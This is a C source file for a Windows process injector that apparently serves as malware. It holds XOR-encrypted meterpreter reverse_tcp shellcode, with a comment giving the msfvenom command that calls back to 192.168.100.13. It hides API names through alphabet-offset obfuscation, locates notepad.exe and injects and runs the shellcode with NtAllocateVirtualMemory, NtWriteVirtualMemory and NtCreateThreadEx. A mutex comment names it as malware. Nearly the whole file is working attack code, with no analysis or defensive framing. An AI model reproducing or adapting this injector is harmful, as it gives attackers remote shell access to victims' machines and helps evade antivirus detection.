#include "native.h"
#include <windows.h>
#include <stdlib.h>
#include <stdio.h>
#include <tlhelp32.h>

#pragma section(".data")
/* placing our payload in the .data section */
/* msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.100.13 LPORT=123 -f csharp exitfunc=thread*/
__declspec(allocate(".data")) unsigned char shellcode[] = {
	"\xe7\x53\x98\xff\xeb\xf3\xd7\x1b\x1b\x1b\x5a\x4a\x5a\x4b\x49\x4a\x4d\x53\x2a\xc9\x7e\x53\x90\x49\x7b\x53\x90\x49\x03\x53\x90\x49\x3b\x53\x14\xac\x51\x51\x56\x2a\xd2\x53\x90\x69\x4b\x53\x2a\xdb\xb7\x27\x7a\x67\x19\x37\x3b\x5a\xda\xd2\x16\x5a\x1a\xda\xf9\xf6\x49\x53\x90\x49\x3b\x90\x59\x27\x5a\x4a\x53\x1a\xcb\x7d\x9a\x63\x03\x10\x19\x14\x9e\x69\x1b\x1b\x1b\x90\x9b\x93\x1b\x1b\x1b\x53\x9e\xdb\x6f\x7c\x53\x1a\xcb\x4b\x90\x53\x03\x5f\x90\x5b\x3b\x52\x1a\xcb\xf8\x4d\x53\xe4\xd2\x56\x2a\xd2\x5a\x90\x2f\x93\x53\x1a\xcd\x53\x2a\xdb\x5a\xda\xd2\x16\xb7\x5a\x1a\xda\x23\xfb\x6e\xea\x57\x18\x57\x3f\x13\x5e\x22\xca\x6e\xc3\x43\x5f\x90\x5b\x3f\x52\x1a\xcb\x7d\x5a\x90\x17\x53\x5f\x90\x5b\x07\x52\x1a\xcb\x5a\x90\x1f\x93\x53\x1a\xcb\x5a\x43\x5a\x43\x45\x42\x41\x5a\x43\x5a\x42\x5a\x41\x53\x98\xf7\x3b\x5a\x49\xe4\xfb\x43\x5a\x42\x41\x53\x90\x09\xf2\x50\xe4\xe4\xe4\x46\x52\xa5\x6c\x68\x29\x44\x28\x29\x1b\x1b\x5a\x4d\x52\x92\xfd\x53\x9a\xf7\xbb\x1a\x1b\x1b\x52\x92\xfe\x52\xa7\x19\x1b\x1b\x60\xdb\xb3\x7f\x16\x5a\x4f\x52\x92\xff\x57\x92\xea\x5a\xa1\x57\x6c\x3d\x1c\xe4\xce\x57\x92\xf1\x73\x1a\x1a\x1b\x1b\x42\x5a\xa1\x32\x9b\x70\x1b\xe4\xce\x71\x11\x5a\x45\x4b\x4b\x56\x2a\xd2\x56\x2a\xdb\x53\xe4\xdb\x53\x92\xd9\x53\xe4\xdb\x53\x92\xda\x5a\xa1\xf1\x14\xc4\xfb\xe4\xce\x53\x92\xdc\x71\x0b\x5a\x43\x57\x92\xf9\x53\x92\xe2\x5a\xa1\x82\xbe\x6f\x7a\xe4\xce\x9e\xdb\x6f\x11\x52\xe4\xd5\x6e\xfe\xf3\x88\x1b\x1b\x1b\x53\x98\xf7\x0b\x53\x92\xf9\x56\x2a\xd2\x71\x1f\x5a\x43\x53\x92\xe2\x5a\xa1\x19\xc2\xd3\x44\xe4\xce\x98\xe3\x1b\x65\x4e\x53\x98\xdf\x3b\x45\x92\xed\x71\x5b\x5a\x42\x73\x1b\x0b\x1b\x1b\x5a\x43\x53\x92\xe9\x53\x2a\xd2\x5a\xa1\x43\xbf\x48\xfe\xe4\xce\x53\x92\xd8\x52\x92\xdc\x56\x2a\xd2\x52\x92\xeb\x53\x92\xc1\x53\x92\xe2\x5a\xa1\x19\xc2\xd3\x44\xe4\xce\x98\xe3\x1b\x66\x33\x43\x5a\x4c\x42\x73\x1b\x5b\x1b\x1b\x5a\x43\x71\x1b\x41\x5a\xa1\x10\x34\x14\x2b\xe4\xce\x4c\x42\x5a\xa1\x6e\x75\x56\x7a\xe4\xce\x52\xe4\xd5\xf2\x27\xe4\xe4\xe4\x53\x1a\xd8\x53\x32\xdd\x53\x9e\xed\x6e\xaf\x5a\xe4\xfc\x43\x71\x1b\x42\xa0\xfb\x06\x31\x11\x5a\x92\xc1\xe4\xce"
	};
	
	
char *GetOriginal(int offsets[],char * ALL_ALPHANUM, int sizeof_offset){
    int size = sizeof_offset / 4;  // Calculate how many characters to retrieve
    char *empty_string = malloc((size + 1) * sizeof(char));  // Allocate memory for the string + null terminator

    if (empty_string == NULL) {
        //printf("Memory allocation failed\n");
        return NULL;
    }

    for (int i = 0; i < size; ++i) {
        char character = ALL_ALPHANUM[offsets[i]];
        empty_string[i] = character;  // Append the character to the string
		//printf("%c,",character);
	}

    empty_string[size] = '\0';  // Null-terminate the string

	return empty_string; 
}

void obfuscate(ALL_ALPHANUM,original)
	char * ALL_ALPHANUM;
	char * original;
{
	for (int i=0; i<strlen(original); i++){
		for (int j=0; j<strlen(ALL_ALPHANUM); j++){
			if (original[i] == ALL_ALPHANUM[j]){
				//printf("%d,",j);
			}
		}
	}
	return;
}

CLIENT_ID enum_processes( 
						FARPROC create_snap_func,
						FARPROC proc_first_func,
						FARPROC proc_next_func
						)
{
	CLIENT_ID CID;
	PROCESSENTRY32 pe32;
	pe32.dwSize = sizeof(PROCESSENTRY32);
	HANDLE hProcess;
	
	//Take snapshot
	HANDLE snapshot = create_snap_func(TH32CS_SNAPPROCESS, 0);
	
	// Enumerate the snapshot
    proc_first_func(snapshot, &pe32);	
    
	// Loop through the whole snapshot until `target.exe` is found
    do {
        if (_stricmp(pe32.szExeFile, "notepad.exe") == 0) {
			CID.UniqueProcess = (HANDLE) pe32.th32ProcessID;
			CID.UniqueThread = NULL;
			
			break;
        }  
    } while (proc_next_func(snapshot, &pe32));
	return CID;
}


void decrypt(shellcode,shellcode_size,key)
	unsigned char shellcode[];
	SIZE_T shellcode_size;
	char key;
{
	//printf("[+] DECRYPTING with \'%c\' key\n",key);
	for (int i=0; i<shellcode_size; i++){
		//printf("\\x%02x",shellcode[i]^key);
		shellcode[i]=shellcode[i]^key;	
	}
	return;
}
HMODULE Get_Module(LPCWSTR Module_Name)
{
	HMODULE hModule;
	//printf("[+] Getting Handle to %lu\n", Module_Name);
	hModule = GetModuleHandleW(Module_Name);
	if (hModule == NULL) {
		//printf("[x] Failed to get handle to module, error: %lu\n", GetLastError());
		exit(1);
	}
	//printf("[+] Got Handle to module!\n");
	//printf("[%ls\t0x%p ]\n", Module_Name, hModule);
	return hModule;
}

HANDLE mutex_stuff(FARPROC mutex_create_func){
	//printf("[+] creating mutex\n");
	
	SECURITY_ATTRIBUTES sec_attr = {(DWORD) sizeof(SECURITY_ATTRIBUTES), NULL , TRUE};
	
	HANDLE my_mutex = mutex_create_func(&sec_attr,TRUE,"nt_ject_mutex");
	if (GetLastError() == ERROR_ALREADY_EXISTS) {
    // Malware instance already running
	//printf("[x] malware is already running \n");
    exit(1);  // Exit or perform cleanup
	}
	//printf("[+] mutex created successfully\n");
	return my_mutex;
}

int main(int argc, char **argv){
	
	// --- START GET PID ARG --- //
	/*
	if (argc < 2){
		printf("[x] USAGE: ./%s [PID]\n",argv[0]);
		return EXIT_FAILURE;
	}
	*/
	// --- END GET PID ARG --- //
	
	
	
	// --- START OFFSETS --- //
	int create_snap_offset[] = {28,17,4,0,19,4,45,14,14,11,7,4,11,15,55,54,44,13,0,15,18,7,14,19};
	int proc_first_offset[] = {41,17,14,2,4,18,18,55,54,31,8,17,18,19};
	int proc_next_offset[] = {41,17,14,2,4,18,18,55,54,39,4,23,19};
	int dll_k_er_32_offset[] = {10,4,17,13,4,11,55,54,62,3,11,11};
	int dll_n__t_offset[] = {39,45,29,37,37};
	int lib_load_offset[] = {37,14,0,3,37,8,1,17,0,17,24,26};
	int mutex_create_offset[] = {28,17,4,0,19,4,38,20,19,4,23,26};
	// --- END OFFSETS --- /
	
	// --- init variables --- //
	
	//int PID=atoi(argv[1]);
	NTSTATUS STATUS;
	HANDLE hThread;
	HANDLE hProcess;
	DWORD OldProtect_MEM = 0;
	DWORD OldProtect_THREAD = 0;
	SIZE_T BytesWritten = 0;
	SIZE_T shellcode_size = sizeof(shellcode);
	//HMODULE hNTDLL = Get_Module(L"NTDLL");
	//HMODULE hNTDLL = Get_Module(L"NTDLL");
	HMODULE hK32 = Get_Module(L"Kernel32");
	PVOID Buffer = NULL;	//for shellcode allocation
	char ALL_ALPHANUM[]="abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789._";
		
	char key1= 'P';
	char key2= 'L';
	char key3= 'S';
	char key4= 'a';
	char key5= '5';
	
	// --- end variables init --- //
	

	// --- START INIT STRUCTS --- //
	ObjectAttributes Object_Attr = { sizeof(Object_Attr),NULL };
	
	CLIENT_ID CID ;
	// --- END INIT STRUCTS --- //

	// --- START GET LoadLibraryA function ---//
	FARPROC L_0_D_LIB = GetProcAddress(hK32,GetOriginal(lib_load_offset,ALL_ALPHANUM,sizeof(lib_load_offset)));
	// --- END GET LoadLibraryA function ---//


	// --- START LOAD KERNEL32 DLL --- //
	HMODULE hDLL_k_er_32 = L_0_D_LIB(GetOriginal(dll_k_er_32_offset,ALL_ALPHANUM,sizeof(dll_k_er_32_offset)));
	if (hDLL_k_er_32 == NULL){
		//printf("[x] COULD NOT LOAD kernel32.dll, err -> %lu\n",GetLastError());
		exit(1);
	}
	// --- END LOAD KERNEL32 DLL ---//
	
	// --- START LOAD NTDLL DLL --- //
	HMODULE hDLL_n__t = L_0_D_LIB(GetOriginal(dll_n__t_offset,ALL_ALPHANUM,sizeof(dll_n__t_offset)));
	if (hDLL_k_er_32 == NULL){
		//printf("[x] COULD NOT LOAD ntdll.dll, err -> %lu\n",GetLastError());
		exit(1);
	}
	// --- END LOAD NTDLL DLL ---//
	
	// --- START FUNCTION PROTOTYPES INIT --- //
	//printf("[+] getting prototypes ready...\n");
	NtOpenProcess NT_OpenProcess = (NtOpenProcess)GetProcAddress(hDLL_n__t, "NtOpenProcess"); 
	NtCreateProcessEx NT_CreateProcessEx = (NtCreateProcessEx)GetProcAddress(hDLL_n__t,"NtCreateProcessEx");
	NtCreateThreadEx NT_CreateThreadEx = (NtCreateThreadEx)GetProcAddress(hDLL_n__t, "NtCreateThreadEx"); 
	NtClose NT_Close = (NtClose)GetProcAddress(hDLL_n__t, "NtClose");
	NtAllocateVirtualMemory NT_VirtualAlloc = (NtAllocateVirtualMemory)GetProcAddress(hDLL_n__t,"NtAllocateVirtualMemory");	
	NtWriteVirtualMemory NT_WriteVirtualMemory = (NtWriteVirtualMemory)GetProcAddress(hDLL_n__t,"NtWriteVirtualMemory");		
	NtProtectVirtualMemory NT_ProtectVirtualMemory = (NtProtectVirtualMemory)GetProcAddress(hDLL_n__t,"NtProtectVirtualMemory");	
	NtWaitForSingleObject NT_WaitForSingleObject = (NtWaitForSingleObject)GetProcAddress(hDLL_n__t,"NtWaitForSingleObject");
	NtFreeVirtualMemory NT_FreeVirtualMemory = (NtFreeVirtualMemory)GetProcAddress(hDLL_n__t,"NtFreeVirtualMemory");
	FARPROC create_snap_func = GetProcAddress(hDLL_k_er_32,GetOriginal(create_snap_offset,ALL_ALPHANUM,sizeof(create_snap_offset)));
	FARPROC proc_first_func = GetProcAddress(hDLL_k_er_32,GetOriginal(proc_first_offset,ALL_ALPHANUM,sizeof(proc_first_offset)));
	FARPROC proc_next_func = GetProcAddress(hDLL_k_er_32,GetOriginal(proc_next_offset,ALL_ALPHANUM,sizeof(proc_next_offset)));
	FARPROC mutex_create_func =  GetProcAddress(hDLL_k_er_32,GetOriginal(mutex_create_offset,ALL_ALPHANUM,sizeof(mutex_create_offset)));
	//printf("[+] prototypes are ready...\n");
	// --- END FUNCTION PROTOTYPES INIT --- //
	HANDLE hMutex=mutex_stuff(mutex_create_func);
	
	CID = enum_processes(create_snap_func,proc_first_func,proc_next_func);
	// --- START GET PROCESS --- //
	//printf("[NtOpenProcess] GETTING Process..\n");
	STATUS = NT_OpenProcess(&hProcess,PROCESS_ALL_ACCESS,&Object_Attr,&CID);
	if (STATUS != STATUS_SUCCESS) {
		//printf("[NtOpenProcess] Failed to get handle to process, error 0x%lx\n", STATUS);
		return EXIT_FAILURE;
	}
	//printf("[NtOpenProcess] Got Handle to process! (%p)\n",hProcess);
	// --- END GET PROCESS --- //

	// --- start decryption --- //
	decrypt(shellcode,shellcode_size,key5);

	decrypt(shellcode,shellcode_size,key4);

	decrypt(shellcode,shellcode_size,key3);

	decrypt(shellcode,shellcode_size,key2);

	decrypt(shellcode,shellcode_size,key1);

	// --- end decryption --- //

	// --- START MEMORY OPERATIONS --- //
	
	//printf("[NtAllocateVirtualMemory] Allocating [RW-] memory..\n");
	STATUS=NT_VirtualAlloc(hProcess,&Buffer,0,&shellcode_size, MEM_COMMIT | MEM_RESERVE ,PAGE_READWRITE);	
	if(STATUS != STATUS_SUCCESS){
		//printf("[NtAllocateVirtualMemory] Failed to allocate memeory , error 0x%lx\n",STATUS);
		goto CLEANUP;
	}
	//printf("[NtAllocateVirtualMemory] Memory Allocated!\n");
	
	//printf("[NtWriteVirtualMemory] Writing shellcode into allocated memory..\n");
	STATUS=NT_WriteVirtualMemory(hProcess,Buffer,shellcode,shellcode_size,&BytesWritten);
	if(STATUS != STATUS_SUCCESS){
		//printf("[NtWriteVirtualMemory] Failed to write into memeory , error 0x%lx\n",STATUS);
		//printf("[NtWriteVirtualMemory] BytesWritten -> %lu\t ShellcodeSize -> %lu\n",BytesWritten,shellcode_size);
		goto CLEANUP;
	}
	//printf("[NtWriteVirtualMemory] Shellcode Written!, shellcode size -> %lu bytes\tactually written -> %lu bytes\n",shellcode_size,BytesWritten);

	//printf("[NtProtectVirtualMemory] Adding [--X] to memory..\n");
	STATUS=NT_ProtectVirtualMemory(hProcess,&Buffer,&shellcode_size,PAGE_EXECUTE_READ,&OldProtect_MEM);
	if(STATUS != STATUS_SUCCESS){
		//printf("[NtProtectVirtualMemory] Failed to add exec to page , error 0x%lx\n",STATUS);
		goto CLEANUP;
	}
	//printf("[NtProtectVirtualMemory] [--X] added!\n");
	
	// --- END MEMORY OPERATIONS --- //
	
	
	// --- START CREATE THREAD --- //

	//printf("[NtCreateThreadEx] CREATING THREAD IN Remote Process\n");
	
	STATUS=NT_CreateThreadEx(&hThread,THREAD_ALL_ACCESS,&Object_Attr,hProcess,Buffer,NULL,FALSE,0,0,0,NULL);
	if(STATUS != STATUS_SUCCESS){
		//printf("[NtCreateThreadEx] Failed to create thread , error 0x%lx\n",STATUS);
		goto CLEANUP;
	}
	//printf("[NtCreateThreadEx] Thread Created (0x%p)..\n",hThread);	
	
	// --- END CREATE THREAD --- //
	
	// --- START WAIT --- //
	//printf("[0x%p] Waiting to Finish Execution\n",hThread);
	STATUS=NT_WaitForSingleObject(hThread,FALSE,NULL);
	//printf("[NtWaitForSingleObject] Thread (0x%p) Finished! Beginning Cleanup\n",hThread);
	// --- END WAIT --- //
	
CLEANUP:
	if (Buffer){
		STATUS=NT_FreeVirtualMemory(hProcess,&Buffer,&shellcode_size,MEM_DECOMMIT);
		if (STATUS_SUCCESS != STATUS) {
            //printf("[NtClose] Failed to decommit allocated buffer, error 0x%lx\n", STATUS);
        }
		//printf("[NtClose] decommitted allocated buffer (0x%p) from process memory\n", Buffer);
	}
	if(hThread){
		//printf("[NtClose] Closing hThread handle\n");
		NT_Close(hThread);
	}
	if(hProcess){
		//printf("[NtClose] Closing hProcess handle\n");
		NT_Close(hProcess);
	}
	
	return EXIT_SUCCESS;
}	
